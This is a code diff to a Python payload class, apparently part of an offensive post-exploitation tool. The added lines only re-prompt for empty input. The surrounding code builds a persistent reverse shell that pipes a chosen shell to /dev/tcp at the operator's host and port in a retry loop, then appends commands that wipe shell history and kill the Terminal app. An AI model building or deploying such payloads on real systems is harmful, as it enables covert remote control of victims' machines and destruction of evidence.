@@ -30,6 +30,8 @@ class payload:
 	def run(self,server):
 		while 1:
 			shell = raw_input(h.info_general_raw("Target Shell: ")).strip(" ")
+			while shell == "":
+			    shell = raw_input(h.info_general_raw("Target Shell: ")).strip(" ")
 			persistence = raw_input(h.info_question_raw("Make Persistent? (y/n): ")).strip(" ").lower()
 			if persistence == "y":
 				shell_command = "while true; do $("+shell+" &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1); sleep 5; done & "
@@ -39,6 +41,8 @@ class payload:
 				break
 		shell_command += "history -wc;killall Terminal"
 		path = raw_input(h.info_general_raw("Output File: ")).strip(" ")
+		while path == "":
+		    path = raw_input(h.info_general_raw("Output File: ")).strip(" ")
 		w = os.environ['OLDPWD']
             	os.chdir(w)
 		if os.path.isdir(path):
